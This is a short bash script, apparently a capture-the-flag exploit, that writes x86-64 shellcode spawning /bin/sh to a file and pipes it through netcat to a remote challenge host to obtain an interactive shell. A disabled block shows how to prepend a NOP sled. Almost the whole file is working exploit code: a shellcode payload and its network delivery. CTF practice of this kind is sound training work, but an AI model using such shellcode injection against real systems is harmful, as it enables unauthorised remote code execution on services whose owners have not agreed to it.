#!/bin/bash

if [[ -e payload_5 ]]; then
    rm payload_5
fi

host="ctf.adl.tw"
port=10002

# Total 208 bytes space for local vars
shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

: << TestNopSled
echo -ne $shellcode > payload_5
shellcodeLen=$(wc -c < payload_5)

nopLen=$((200 - shellcodeLen - 145))
nopSeq=$(printf "\x90%.0s" $(seq 1 $nopLen))

echo -ne $nopSeq$shellcode > payload_5
TestNopSled

echo -ne $shellcode > payload_5

cat payload_5 - | nc $host $port
